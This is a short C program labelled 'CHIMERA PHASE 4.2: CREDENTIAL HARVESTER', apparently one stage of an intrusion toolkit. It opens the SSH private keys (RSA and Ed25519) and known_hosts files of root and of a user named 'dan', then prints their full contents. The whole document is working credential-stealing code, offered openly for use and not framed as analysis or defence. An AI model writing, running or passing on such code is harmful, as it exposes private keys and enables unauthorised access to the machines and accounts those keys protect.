#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

void harvest_file(const char* path, const char* label) {
    FILE *fp = fopen(path, "r");
    if (fp == NULL) return;

    printf("\n[!!!] HARVESTED: %s (%s)\n", label, path);
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        printf("%s", buffer);
    }
    fclose(fp);
    printf("\n[--- END OF %s ---]\n", label);
}

int main() {
    printf("\n--- CHIMERA PHASE 4.2: CREDENTIAL HARVESTER ---\n");

    // Targets for SSH Keys
    const char* paths[] = {
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
        "/root/.ssh/known_hosts",
        "/home/dan/.ssh/id_rsa",
        "/home/dan/.ssh/id_ed25519",
        "/home/dan/.ssh/known_hosts"
    };

    const char* labels[] = {
        "Root RSA Key",
        "Root Ed25519 Key",
        "Root Known Hosts",
        "User RSA Key",
        "User Ed25519 Key",
        "User Known Hosts"
    };

    for (int i = 0; i < 6; i++) {
        harvest_file(paths[i], labels[i]);
    }

    printf("\n--- HARVEST COMPLETE ---\n");
    return 0;
}
